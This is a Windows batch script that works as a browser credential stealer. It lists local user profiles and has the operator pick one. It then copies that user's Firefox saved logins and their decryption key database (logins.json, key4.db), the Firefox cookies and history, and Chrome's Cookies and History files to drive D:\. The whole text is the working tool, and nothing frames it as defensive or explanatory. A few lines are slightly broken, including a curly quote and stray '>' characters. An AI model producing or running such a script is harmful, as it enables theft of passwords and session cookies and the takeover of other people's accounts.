@echo off

setlocal enabledelayedexpansion
set "directory=C:\Users"
set /a count=0

echo.
echo Select User
echo -----------
echo.

for /d %%i in ("%directory%\*") do (
     set /a count+=1
     echo !count! %%~nxi
)

echo.
set /p selection="> "
set /a count = 0
set "user=”

for /d %%i in ("%directory%\*") do (
     set /a count+=1
     if "!count!"=="%selection%" (
         set "user=%%~nxi"
         goto end_loop
     )
)
:end_loop
echo.
echo Selected: %user%
set "targetFile=logins.json"
set "searchDir=C:\Users\%user%\AppData\Roaming\Mozilla\Firefox\Profiles\"


for /r "%searchDir%" %%i in (%targetFile%) do (
     copy "%%i" "D:\" > nul
)

set "targetFile=key4.db"
set "searchDir=C:\Users\%user%\AppData\Roaming\Mozilla\Firefox\Profiles\"


for /r "%searchDir%" %%i in (%targetFile%) do (
     copy "%%i" "D:\" > nul
)

set "targetFile=cookies.sqlite"
set "searchDir=C:\Users\%user%\AppData\Roaming\Mozilla\Firefox\Profiles\"


for /r "%searchDir%" %%i in (%targetFile%) do (
     copy "%%i" "D:\" > nul
)

set "targetFile=places.sqlite"
set "searchDir=C:\Users\%user%\AppData\Roaming\Mozilla\Firefox\Profiles\"


for /r "%searchDir%" %%i in (%targetFile%) do (
     copy "%%i" "D:\" > nul
)

set "targetFile=Cookies"
set "searchDir=C:\Users\%user%\AppData\Local\Google\Chrome\"


for /r "%searchDir%" %%i in (%targetFile%) do (
     copy "%%i" "D:\" > nul
)


set "targetFile=History"
set "searchDir=C:\Users\%user%\AppData\Local\Google\Chrome\"
>
>
for /r "%searchDir%" %%i in (%targetFile%) do (
     copy "%%i" "D:\" > nul
)

echo Done.
echo.
timeout /t 2 /nobreak > nul
endlocal
